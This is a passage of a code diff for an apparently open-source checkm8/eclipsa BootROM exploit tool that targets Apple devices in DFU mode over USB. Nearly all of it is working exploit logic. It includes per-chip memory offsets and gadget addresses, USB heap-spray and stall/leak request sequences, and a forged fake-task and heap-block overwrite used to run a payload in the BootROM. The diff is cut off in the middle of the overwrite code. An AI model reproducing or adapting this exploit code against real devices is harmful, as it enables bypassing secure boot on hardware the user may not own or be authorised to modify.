@@ -1,4 +1,4 @@
-/* Copyright 2022 0x7ff
+/* Copyright 2023 0x7ff
  *
  * Licensed under the Apache License, Version 2.0 (the "License");
  * you may not use this file except in compliance with the License.
@@ -32,25 +32,19 @@
 #define AES_CMD_CBC (16U)
 #define AES_BLOCK_SZ (16)
 #define DFU_STATUS_OK (0)
-#define TASK_NAME_MAX (15)
 #define DFU_GET_STATUS (3)
 #define DFU_CLR_STATUS (4)
-#define DFU_ARCH_SZ (0x310)
 #define MAX_BLOCK_SZ (0x50)
 #define DFU_MODE_PID (0x1227)
 #define DFU_STATE_MANIFEST (7)
-#define TASK_STACK_MIN (0x4000)
 #define EP0_MAX_PACKET_SZ (0x40)
-#define DFU_HEAP_BLOCK_SZ (0x40)
 #define DFU_FILE_SUFFIX_LEN (16)
-#define TASK_MAGIC_1 (0x74736B32)
 #define AES_KEY_SZ_BYTES_256 (32)
 #define AES_KEY_TYPE_GID0 (0x200U)
 #define DFU_MAX_TRANSFER_SZ (0x800)
 #define DFU_STATE_MANIFEST_SYNC (6)
 #define AES_KEY_SZ_256 (0x20000000U)
 #define ARM_16K_TT_L2_SZ (0x2000000U)
-#define TASK_STACK_MAGIC (0x7374616B)
 #define DFU_STATE_MANIFEST_WAIT_RESET (8)
 #define DONE_MAGIC (0x646F6E65646F6E65ULL)
 #define EXEC_MAGIC (0x6578656365786563ULL)
@@ -95,10 +89,6 @@ typedef struct {
 } der_item_spec_t;
 
 typedef struct {
-	uint64_t prev, next;
-} dfu_list_node_t;
-
-typedef struct {
 	uint32_t endpoint, pad_0;
 	uint64_t io_buffer;
 	uint32_t status, io_len, ret_cnt, pad_1;
@@ -119,35 +109,7 @@ typedef struct {
 } img4_t;
 
 typedef struct {
-	uint32_t magic_0, pad_0;
-	dfu_list_node_t task_list, queue_list;
-	enum {
-		TASK_INITIAL,
-		TASK_READY,
-		TASK_RUNNING,
-		TASK_BLOCKED,
-		TASK_SLEEPING,
-		TASK_FINISHED
-	} state;
-	uint32_t irq_dis_cnt;
-	struct {
-		uint64_t x[29], fp, lr, sp;
-		uint8_t shc[DFU_ARCH_SZ - 32 * sizeof(uint64_t)];
-	} arch;
-	struct {
-		dfu_list_node_t list;
-		uint64_t sched_ticks, delay, cb, arg;
-	} callout;
-	dfu_list_node_t ret_waiters_list;
-	uint32_t ret, pad_1;
-	uint64_t routine, arg, stack_base, stack_len;
-	char name[TASK_NAME_MAX + 1];
-	uint32_t id, magic_1;
-} dfu_task_t;
-
-typedef struct {
 	dfu_callback_t callback;
-	uint64_t heap_pad_0, heap_pad_1;
 } checkm8_overwrite_t;
 
 typedef struct {
@@ -155,25 +117,13 @@ typedef struct {
 } checkm8_overwrite_armv7_t;
 
 typedef struct {
-	dfu_task_t synopsys_task;
-	struct {
-		uint64_t this_free : 1, prev_free : 1, prev_sz : 62, this_sz;
-		uint8_t pad[DFU_HEAP_BLOCK_SZ - 2 * sizeof(uint64_t)];
-	} heap_block;
-	dfu_task_t fake_task;
-} eclipsa_overwrite_t;
-
-typedef struct {
 	uint16_t vid, pid;
 #ifdef HAVE_LIBUSB
-	int usb_interface;
-	struct libusb_context *context;
 	struct libusb_device_handle *device;
 #else
 	io_service_t serv;
 	IOUSBDeviceInterface320 **device;
 	CFRunLoopSourceRef async_event_source;
-	IOUSBInterfaceInterface300 **interface;
 #endif
 } usb_handle_t;
 
@@ -199,17 +149,7 @@ extern unsigned payload_A9_bin_len, payload_notA9_bin_len, payload_notA9_armv7_b
 #include "payload_handle_checkm8_request.h"
 #include "payload_handle_checkm8_request_armv7.h"
 
-static enum {
-	STAGE_RESET,
-	STAGE_SPRAY,
-	STAGE_SETUP,
-	STAGE_PATCH,
-	STAGE_PWNED
-} stage;
 static uint16_t cpid;
-#ifndef HAVE_LIBUSB
-static bool manual_reset;
-#endif
 static unsigned usb_timeout;
 static uint32_t payload_dest_armv7;
 static const char *pwnd_str = " PWND:[checkm8]";
@@ -231,7 +171,7 @@ static struct {
 	uint16_t id_vendor, id_product, bcd_device;
 	uint8_t i_manufacturer, i_product, i_serial_number, b_num_configurations;
 } device_descriptor;
-static size_t config_hole, ttbr0_vrom_off, ttbr0_sram_off, config_large_leak, config_overwrite_pad = offsetof(eclipsa_overwrite_t, synopsys_task.callout);
+static size_t config_hole, ttbr0_vrom_off, ttbr0_sram_off, config_large_leak, config_overwrite_pad;
 static uint64_t tlbi, nop_gadget, ret_gadget, patch_addr, ttbr0_addr, func_gadget, write_ttbr0, memcpy_addr, aes_crypto_cmd, total_received, io_buffer_addr, boot_tramp_end, gUSBSerialNumber, dfu_handle_request, usb_core_do_transfer, arch_task_tramp_addr, insecure_memory_base, synopsys_routine_addr, handle_interface_request, usb_create_string_descriptor, usb_serial_number_string_descriptor;
 
 static void
@@ -250,35 +190,29 @@ sleep_ms(unsigned ms) {
 #ifdef HAVE_LIBUSB
 static void
 close_usb_handle(usb_handle_t *handle) {
-	libusb_release_interface(handle->device, handle->usb_interface);
 	libusb_close(handle->device);
-	libusb_exit(handle->context);
+	libusb_exit(NULL);
 }
 
-static bool
+static void
 reset_usb_handle(const usb_handle_t *handle) {
-	return libusb_reset_device(handle->device) == LIBUSB_SUCCESS;
+	libusb_reset_device(handle->device);
 }
 
 static bool
-wait_usb_handle(usb_handle_t *handle, uint8_t usb_interface, uint8_t usb_alt_interface, usb_check_cb_t usb_check_cb, void *arg) {
-	if(libusb_init(&handle->context) == LIBUSB_SUCCESS) {
+wait_usb_handle(usb_handle_t *handle, usb_check_cb_t usb_check_cb, void *arg) {
+	if(libusb_init(NULL) == LIBUSB_SUCCESS) {
 		printf("[libusb] Waiting for the USB handle with VID: 0x%" PRIX16 ", PID: 0x%" PRIX16 "\n", handle->vid, handle->pid);
 		for(;;) {
-			if((handle->device = libusb_open_device_with_vid_pid(handle->context, handle->vid, handle->pid)) != NULL) {
-				if(libusb_set_configuration(handle->device, 1) == LIBUSB_SUCCESS && libusb_claim_interface(handle->device, usb_interface) == LIBUSB_SUCCESS) {
-					if((usb_alt_interface != 1 || libusb_set_interface_alt_setting(handle->device, usb_interface, usb_alt_interface) == LIBUSB_SUCCESS) && (usb_check_cb == NULL || usb_check_cb(handle, arg))) {
-						handle->usb_interface = usb_interface;
-						puts("Found the USB handle.");
-						return true;
-					}
-					libusb_release_interface(handle->device, usb_interface);
+			if((handle->device = libusb_open_device_with_vid_pid(NULL, handle->vid, handle->pid)) != NULL) {
+				if(libusb_set_configuration(handle->device, 1) == LIBUSB_SUCCESS && (usb_check_cb == NULL || usb_check_cb(handle, arg))) {
+					puts("Found the USB handle.");
+					return true;
 				}
 				libusb_close(handle->device);
 			}
 			sleep_ms(usb_timeout);
 		}
-		libusb_exit(handle->context);
 	}
 	return false;
 }
@@ -322,7 +256,7 @@ send_usb_control_request_async(const usb_handle_t *handle, uint8_t bm_request_ty
 			if(libusb_submit_transfer(transfer) == LIBUSB_SUCCESS) {
 				tv.tv_sec = usb_abort_timeout / 1000;
 				tv.tv_usec = (usb_abort_timeout % 1000) * 1000;
-				while(completed == 0 && libusb_handle_events_timeout_completed(handle->context, &tv, &completed) == LIBUSB_SUCCESS) {
+				while(completed == 0 && libusb_handle_events_timeout_completed(NULL, &tv, &completed) == LIBUSB_SUCCESS) {
 					libusb_cancel_transfer(transfer);
 				}
 				if(completed != 0) {
@@ -353,7 +287,6 @@ init_usb_handle(usb_handle_t *handle, uint16_t vid, uint16_t pid) {
 	handle->vid = vid;
 	handle->pid = pid;
 	handle->device = NULL;
-	handle->context = NULL;
 }
 #else
 static void
@@ -376,12 +309,12 @@ query_usb_interface(io_service_t serv, CFUUIDRef plugin_type, CFUUIDRef interfac
 		ret = (*plugin_interface)->QueryInterface(plugin_interface, CFUUIDGetUUIDBytes(interface_type), interface) == kIOReturnSuccess;
 		IODestroyPlugInInterface(plugin_interface);
 	}
+	IOObjectRelease(serv);
 	return ret;
 }
 
 static void
 close_usb_device(usb_handle_t *handle) {
-	IOObjectRelease(handle->serv);
 	CFRunLoopRemoveSource(CFRunLoopGetCurrent(), handle->async_event_source, kCFRunLoopDefaultMode);
 	CFRelease(handle->async_event_source);
 	(*handle->device)->USBDeviceClose(handle->device);
@@ -389,14 +322,7 @@ close_usb_device(usb_handle_t *handle) {
 }
 
 static void
-close_usb_interface(usb_handle_t *handle) {
-	(*handle->interface)->USBInterfaceClose(handle->interface);
-	(*handle->interface)->Release(handle->interface);
-}
-
-static void
 close_usb_handle(usb_handle_t *handle) {
-	close_usb_interface(handle);
 	close_usb_device(handle);
 }
 
@@ -408,7 +334,6 @@ open_usb_device(io_service_t serv, usb_handle_t *handle) {
 		if((*handle->device)->USBDeviceOpen(handle->device) == kIOReturnSuccess) {
 			if((*handle->device)->SetConfiguration(handle->device, 1) == kIOReturnSuccess && (*handle->device)->CreateDeviceAsyncEventSource(handle->device, &handle->async_event_source) == kIOReturnSuccess) {
 				CFRunLoopAddSource(CFRunLoopGetCurrent(), handle->async_event_source, kCFRunLoopDefaultMode);
-				handle->serv = serv;
 				ret = true;
 			} else {
 				(*handle->device)->USBDeviceClose(handle->device);
@@ -416,53 +341,13 @@ open_usb_device(io_service_t serv, usb_handle_t *handle) {
 		}
 		if(!ret) {
 			(*handle->device)->Release(handle->device);
-			IOObjectRelease(serv);
 		}
 	}
 	return ret;
 }
 
 static bool
-open_usb_interface(uint8_t usb_interface, uint8_t usb_alt_interface, usb_handle_t *handle) {
-	IOUSBFindInterfaceRequest interface_request;
-	io_iterator_t iter;
-	io_service_t serv;
-	bool ret = false;
-	size_t i;
-
-	interface_request.bInterfaceProtocol = interface_request.bInterfaceSubClass = interface_request.bAlternateSetting = interface_request.bInterfaceClass = kIOUSBFindInterfaceDontCare;
-	if((*handle->device)->CreateInterfaceIterator(handle->device, &interface_request, &iter) == kIOReturnSuccess) {
-		serv = IO_OBJECT_NULL;
-		for(i = 0; i <= usb_interface; ++i) {
-			if((serv = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
-				if(i == usb_interface) {
-					break;
-				}
-				IOObjectRelease(serv);
-			}
-		}
-		IOObjectRelease(iter);
-		if(serv != IO_OBJECT_NULL) {
-			if(query_usb_interface(serv, kIOUSBInterfaceUserClientTypeID, kIOUSBInterfaceInterfaceID300, (LPVOID *)&handle->interface)) {
-				if((*handle->interface)->USBInterfaceOpenSeize(handle->interface) == kIOReturnSuccess) {
-					if(usb_alt_interface != 1 || (*handle->interface)->SetAlternateInterface(handle->interface, usb_alt_interface) == kIOReturnSuccess) {
-						ret = true;
-					} else {
-						(*handle->interface)->USBInterfaceClose(handle->interface);
-					}
-				}
-				if(!ret) {
-					(*handle->interface)->Release(handle->interface);
-				}
-			}
-			IOObjectRelease(serv);
-		}
-	}
-	return ret;
-}
-
-static bool
-wait_usb_handle(usb_handle_t *handle, uint8_t usb_interface, uint8_t usb_alt_interface, usb_check_cb_t usb_check_cb, void *arg) {
+wait_usb_handle(usb_handle_t *handle, usb_check_cb_t usb_check_cb, void *arg) {
 	CFMutableDictionaryRef matching_dict;
 	const char *darwin_device_class;
 	io_iterator_t iter;
@@ -481,13 +366,10 @@ wait_usb_handle(usb_handle_t *handle, uint8_t usb_interface, uint8_t usb_alt_int
 		if(IOServiceGetMatchingServices(0, matching_dict, &iter) == kIOReturnSuccess) {
 			while((serv = IOIteratorNext(iter)) != IO_OBJECT_NULL) {
 				if(open_usb_device(serv, handle)) {
-					if(open_usb_interface(usb_interface, usb_alt_interface, handle)) {
-						if(usb_check_cb == NULL || usb_check_cb(handle, arg)) {
-							puts("Found the USB handle.");
-							ret = true;
-							break;
-						}
-						close_usb_interface(handle);
+					if(usb_check_cb == NULL || usb_check_cb(handle, arg)) {
+						puts("Found the USB handle.");
+						ret = true;
+						break;
 					}
 					close_usb_device(handle);
 				}
@@ -502,38 +384,10 @@ wait_usb_handle(usb_handle_t *handle, uint8_t usb_interface, uint8_t usb_alt_int
 	return ret;
 }
 
-static bool
-get_usb_session_id(const usb_handle_t *handle, UInt64 *session_id) {
-	CFNumberRef session_id_cf = IORegistryEntryCreateCFProperty(handle->serv, CFSTR("sessionID"), kCFAllocatorDefault, kNilOptions);
-	bool ret = false;
-
-	if(session_id_cf != NULL) {
-		ret = CFGetTypeID(session_id_cf) == CFNumberGetTypeID() && CFNumberGetValue(session_id_cf, kCFNumberSInt64Type, session_id);
-		CFRelease(session_id_cf);
-	}
-	return ret;
-}
-
-static bool
-manual_reset_check_usb_device(usb_handle_t *handle, void *session_id) {
-	UInt64 cur_session_id;
-
-	return get_usb_session_id(handle, &cur_session_id) && cur_session_id != *(const UInt64 *)session_id;
-}
-
-static bool
+static void
 reset_usb_handle(usb_handle_t *handle) {
-	UInt64 session_id;
-
-	if(manual_reset && (stage == STAGE_SETUP || stage == STAGE_PATCH) && (cpid == 0x8960 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011)) {
-		if(get_usb_session_id(handle, &session_id) && IOObjectRetain(handle->serv) == kIOReturnSuccess) {
-			close_usb_handle(handle);
-			puts("Please disconnect and reconnect the lightning cable now.");
-			return wait_usb_handle(handle, 0, 0, manual_reset_check_usb_device, &session_id);
-		}
-		return false;
-	}
-	return (*handle->device)->ResetDevice(handle->device) == kIOReturnSuccess && (*handle->device)->USBDeviceReEnumerate(handle->device, 0) == kIOReturnSuccess;
+	(*handle->device)->ResetDevice(handle->device);
+	(*handle->device)->USBDeviceReEnumerate(handle->device, 0);
 }
 
 static void
@@ -607,7 +461,6 @@ init_usb_handle(usb_handle_t *handle, uint16_t vid, uint16_t pid) {
 	handle->vid = vid;
 	handle->pid = pid;
 	handle->device = NULL;
-	handle->interface = NULL;
 }
 #endif
 
@@ -711,7 +564,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1704.10]") != NULL) {
 			cpid = 0x8960;
 			config_large_leak = 7936;
-			config_overwrite_pad = 0x5C0;
+			config_overwrite_pad = 0x7C0;
 			patch_addr = 0x100005CE0;
 			memcpy_addr = 0x10000ED50;
 			aes_crypto_cmd = 0x10000B9A8;
@@ -726,6 +579,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			usb_serial_number_string_descriptor = 0x180080562;
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1991.0.0.2.16]") != NULL) {
 			cpid = 0x7001;
+			config_overwrite_pad = 0x500;
 			patch_addr = 0x10000AD04;
 			memcpy_addr = 0x100013F10;
 			aes_crypto_cmd = 0x100010A90;
@@ -743,6 +597,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			usb_serial_number_string_descriptor = 0x180080C2A;
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-1992.0.0.1.19]") != NULL) {
 			cpid = 0x7000;
+			config_overwrite_pad = 0x500;
 			patch_addr = 0x100007E98;
 			memcpy_addr = 0x100010E70;
 			aes_crypto_cmd = 0x10000DA90;
@@ -760,8 +615,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			usb_serial_number_string_descriptor = 0x18008062A;
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2098.0.0.2.4]") != NULL) {
 			cpid = 0x7002;
-			config_hole = 64;
-			config_overwrite_pad = 0x300;
+			config_overwrite_pad = 0x500;
 			memcpy_addr = 0x89F4;
 			aes_crypto_cmd = 0x6341;
 			total_received = 0x46005860;
@@ -775,6 +629,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			usb_serial_number_string_descriptor = 0x4600034A;
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.2.22]") != NULL) {
 			cpid = 0x8003;
+			config_overwrite_pad = 0x500;
 			patch_addr = 0x10000812C;
 			ttbr0_addr = 0x1800C8000;
 			memcpy_addr = 0x100011030;
@@ -794,6 +649,7 @@ checkm8_check_usb_device(usb_handle_t *handle, void *pwned) {
 			usb_serial_number_string_descriptor = 0x1800807DA;
 		} else if(strstr(usb_serial_num, " SRTG:[iBoot-2234.0.0.3.3]") != NULL) {
 			cpid = 0x8000;
+			config_overwrite_pad = 0x500;
 			patch_addr = 0x10000812C;
 			ttbr0_addr = 0x1800C8000;
 			memcpy_addr = 0x100011030;
@@ -1001,17 +857,23 @@ checkm8_stage_reset(const usb_handle_t *handle) {
 }
 
 static bool
+checkm8_usb_request_leak(const usb_handle_t *handle) {
+	transfer_ret_t transfer_ret;
+
+	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, config_large_leak == 0 ? 1 : 0, &transfer_ret) && transfer_ret.sz == 0;
+}
+
+static void
 checkm8_stall(const usb_handle_t *handle) {
 	unsigned usb_abort_timeout = usb_timeout;
 	transfer_ret_t transfer_ret;
 
-	while(send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ, usb_abort_timeout, &transfer_ret)) {
-		if(transfer_ret.sz < 3 * EP0_MAX_PACKET_SZ && send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &transfer_ret) && transfer_ret.sz == 0) {
-			return true;
+	for(;;) {
+		if(send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 3 * EP0_MAX_PACKET_SZ, usb_abort_timeout, &transfer_ret) && transfer_ret.sz < 3 * EP0_MAX_PACKET_SZ && checkm8_usb_request_leak(handle)) {
+			break;
 		}
 		usb_abort_timeout = (usb_abort_timeout + 1) % usb_timeout;
 	}
-	return false;
 }
 
 static bool
@@ -1029,47 +891,42 @@ checkm8_usb_request_stall(const usb_handle_t *handle) {
 }
 
 static bool
-checkm8_usb_request_leak(const usb_handle_t *handle) {
-	transfer_ret_t transfer_ret;
-
-	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ, 1, &transfer_ret) && transfer_ret.sz == 0;
-}
-
-static bool
 checkm8_usb_request_no_leak(const usb_handle_t *handle) {
 	transfer_ret_t transfer_ret;
 
-	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, EP0_MAX_PACKET_SZ + 1, 1, &transfer_ret) && transfer_ret.sz == 0;
+	return send_usb_control_request_async_no_data(handle, 0x80, 6, (3U << 8U) | device_descriptor.i_serial_number, USB_MAX_STRING_DESCRIPTOR_IDX, 2 * EP0_MAX_PACKET_SZ, 0, &transfer_ret) && transfer_ret.sz == 0;
 }
 
 static bool
 checkm8_stage_spray(const usb_handle_t *handle) {
-	size_t i;
+	size_t i, config_leak;
 
 	if(config_large_leak == 0) {
-		if(!checkm8_stall(handle)) {
-			return false;
-		}
-		for(i = 0; i < config_hole; ++i) {
-			if(!checkm8_no_leak(handle)) {
-				return false;
+		if(cpid == 0x7001 || cpid == 0x7000 || cpid == 0x7002 || cpid == 0x8003 || cpid == 0x8000) {
+			while(!checkm8_usb_request_stall(handle) || !checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
+		} else {
+			checkm8_stall(handle);
+			for(i = 0; i < config_hole; ++i) {
+				while(!checkm8_no_leak(handle)) {}
 			}
+			while(!checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {}
 		}
-		if(!checkm8_usb_request_leak(handle) || !checkm8_no_leak(handle)) {
-			return false;
-		}
+		send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 3 * EP0_MAX_PACKET_SZ + 1, NULL);
 	} else {
-		if(!checkm8_usb_request_stall(handle)) {
-			return false;
-		}
-		for(i = 0; i < config_large_leak; ++i) {
-			if(!checkm8_usb_request_leak(handle)) {
-				return false;
+		send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, 0, NULL);
+		dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST_SYNC);
+		dfu_check_status(handle, DFU_STATUS_OK, DFU_STATE_MANIFEST);
+		if((config_leak = config_large_leak % EP0_MAX_PACKET_SZ) == 0) {
+			while(!checkm8_usb_request_no_leak(handle) || !checkm8_usb_request_leak(handle) || !checkm8_usb_request_stall(handle)) {}
+		} else {
+			for(i = 0; i < config_leak; ++i) {
+				while(!checkm8_usb_request_no_leak(handle) || !checkm8_usb_request_leak(handle)) {}
+			}
+			for(i = 0; i < (config_large_leak - config_leak) / (2 * EP0_MAX_PACKET_SZ); ++i) {
+				while(!checkm8_usb_request_stall(handle)) {}
 			}
 		}
-		if(!checkm8_usb_request_no_leak(handle)) {
-			return false;
-		}
+		send_usb_control_request_no_data(handle, 0x80, 8, 0, 0, 2 * EP0_MAX_PACKET_SZ + 1, NULL);
 	}
 	return true;
 }
@@ -1079,14 +936,11 @@ checkm8_stage_setup(const usb_handle_t *handle) {
 	unsigned usb_abort_timeout = usb_timeout;
 	transfer_ret_t transfer_ret;
 
-	while(send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, usb_abort_timeout, &transfer_ret)) {
-		if(transfer_ret.sz < config_overwrite_pad && send_usb_control_request_no_data(handle, 0, 0, 0, 0, config_overwrite_pad - transfer_ret.sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
-			send_usb_control_request_no_data(handle, 0x21, DFU_CLR_STATUS, 0, 0, 0, NULL);
+	for(;;) {
+		if(send_usb_control_request_async_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, DFU_MAX_TRANSFER_SZ, usb_abort_timeout, &transfer_ret) && transfer_ret.sz < config_overwrite_pad && send_usb_control_request_no_data(handle, 0, 0, 0, 0, config_overwrite_pad - transfer_ret.sz, &transfer_ret) && transfer_ret.ret == USB_TRANSFER_STALL) {
 			return true;
 		}
-		if(!send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL)) {
-			break;
-		}
+		send_usb_control_request_no_data(handle, 0x21, DFU_DNLOAD, 0, 0, EP0_MAX_PACKET_SZ, NULL);
 		usb_abort_timeout = (usb_abort_timeout + 1) % usb_timeout;
 	}
 	return false;
@@ -1209,13 +1063,12 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 	uint8_t *data, *payload, *payload_handle_checkm8_request;
 	checkm8_overwrite_armv7_t checkm8_overwrite_armv7;
 	checkm8_overwrite_t checkm8_overwrite;
-	eclipsa_overwrite_t eclipsa_overwrite;
 	transfer_ret_t transfer_ret;
 	bool ret = false;
 	void *overwrite;
 	uint64_t reg;
 
-	if(cpid == 0x8000 || cpid == 0x8003) {
+	if(cpid == 0x8003 || cpid == 0x8000) {
 		if(payload_A9_bin_len > sizeof(A9)) {
 			payload = payload_A9_bin;
 			payload_sz = payload_A9_bin_len - sizeof(A9);
@@ -1223,7 +1076,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			payload = NULL;
 			payload_sz = 0;
 		}
-	} else if(cpid == 0x8960 || cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
+	} else if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
 		if(payload_notA9_bin_len > sizeof(notA9)) {
 			payload = payload_notA9_bin;
 			payload_sz = payload_notA9_bin_len - sizeof(notA9);
@@ -1239,13 +1092,13 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 		payload_sz = 0;
 	}
 	if(payload != NULL) {
-		if(cpid == 0x8960 || cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
+		if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8003 || cpid == 0x8000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
 			if(payload_handle_checkm8_request_bin_len > sizeof(handle_checkm8_request)) {
 				payload_handle_checkm8_request = payload_handle_checkm8_request_bin;
 				payload_handle_checkm8_request_sz = payload_handle_checkm8_request_bin_len - sizeof(handle_checkm8_request);
-				if(cpid == 0x8000 || cpid == 0x8003) {
+				if(cpid == 0x8003 || cpid == 0x8000) {
 					data = calloc(1, payload_sz + sizeof(A9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
-				} else if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
+				} else if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
 					data = calloc(1, DFU_MAX_TRANSFER_SZ + payload_sz + sizeof(notA9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
 				} else {
 					data = calloc(1, payload_sz + sizeof(notA9) + payload_handle_checkm8_request_sz + sizeof(handle_checkm8_request));
@@ -1265,7 +1118,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			data = NULL;
 		}
 		if(data != NULL) {
-			if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
+			if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
 				reg = 0x1000006A5;
 				memcpy(data + ttbr0_vrom_off, &reg, sizeof(reg));
 				reg = 0x60000100000625;
@@ -1281,7 +1134,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			}
 			memcpy(data + data_sz, payload, payload_sz);
 			data_sz += payload_sz;
-			if(cpid == 0x8000 || cpid == 0x8003) {
+			if(cpid == 0x8003 || cpid == 0x8000) {
 				memset(A9.pwnd, '\0', sizeof(A9.pwnd));
 				memcpy(A9.pwnd, pwnd_str, strlen(pwnd_str));
 				A9.payload_dest = boot_tramp_end - payload_handle_checkm8_request_sz - sizeof(handle_checkm8_request);
@@ -1308,7 +1161,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 				handle_checkm8_request.usb_core_do_transfer = usb_core_do_transfer;
 				memcpy(data + data_sz, &handle_checkm8_request, sizeof(handle_checkm8_request));
 				data_sz += sizeof(handle_checkm8_request);
-			} else if(cpid == 0x8960 || cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
+			} else if(cpid == 0x8960 || cpid == 0x7001 || cpid == 0x7000 || cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
 				memset(notA9.pwnd, '\0', sizeof(notA9.pwnd));
 				memcpy(notA9.pwnd, pwnd_str, strlen(pwnd_str));
 				notA9.payload_dest = boot_tramp_end - payload_handle_checkm8_request_sz - sizeof(handle_checkm8_request);
@@ -1320,7 +1173,7 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 				notA9.usb_create_string_descriptor = usb_create_string_descriptor;
 				notA9.usb_serial_number_string_descriptor = usb_serial_number_string_descriptor;
 				notA9.patch_addr = patch_addr;
-				if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8012 || cpid == 0x8015) {
+				if(cpid == 0x8001 || cpid == 0x8010 || cpid == 0x8011 || cpid == 0x8015 || cpid == 0x8012) {
 					notA9.patch_addr += ARM_16K_TT_L2_SZ;
 				}
 				notA9.total_received = total_received;
@@ -1365,68 +1218,35 @@ checkm8_stage_patch(const usb_handle_t *handle) {
 			}
 			overwrite = NULL;
 			overwrite_sz = 0;
-			if(cpid == 0x7000 || cpid == 0x7001 || cpid == 0x8000 || cpid == 0x8003) {
-				memset(&eclipsa_overwrite, '\0', sizeof(eclipsa_overwrite));
-				eclipsa_overwrite.synopsys_task.id = 5;
-				strcpy(eclipsa_overwrite.synopsys_task.name, "usb");
-				eclipsa_overwrite.synopsys_task.magic_1 = TASK_MAGIC_1;
-				eclipsa_overwrite.synopsys_task.stack_len = TASK_STACK_MIN;
-				eclipsa_overwrite.synopsys_task.routine = synopsys_routine_addr;
-				eclipsa_overwrite.synopsys_task.stack_base = io_buffer_addr + offsetof(eclipsa_overwrite_t, fake_task);
-				eclipsa_overwrite.synopsys_task.ret_waiters_list.prev = eclipsa_overwrite.synopsys_task.ret_waiters_list.next = eclipsa_overwrite.synopsys_task.stack_base + offsetof(dfu_task_t, queue_list);
-				eclipsa_overwrite.heap_block.prev_sz = sizeof(eclipsa_overwrite.synopsys_task) / sizeof(eclipsa_overwrite.heap_block) + 1;
-				eclipsa_overwrite.heap_block.this_sz = eclipsa_overwrite.synopsys_task.stack_len / sizeof(eclipsa_overwrite.heap_block) + 2;
-				eclipsa_overwrite.fake_task.id = 6;
-				eclipsa_overwrite.fake_task.irq_dis_cnt = 1;
-				eclipsa_overwrite.fake_task.state = TASK_RUNNING;
-				eclipsa_overwrite.fake_task.magic_1 = TASK_MAGIC_1;
-				strcpy(eclipsa_overwrite.fake_task.name, "eclipsa");
-				eclipsa_overwrite.fake_task.magic_0 = TASK_STACK_MAGIC;
-				eclipsa_overwrite.fake_task.arch.lr = arch_task_tramp_addr;
-				memcpy(eclipsa_overwrite.fake_task.arch.shc, data, data_sz);
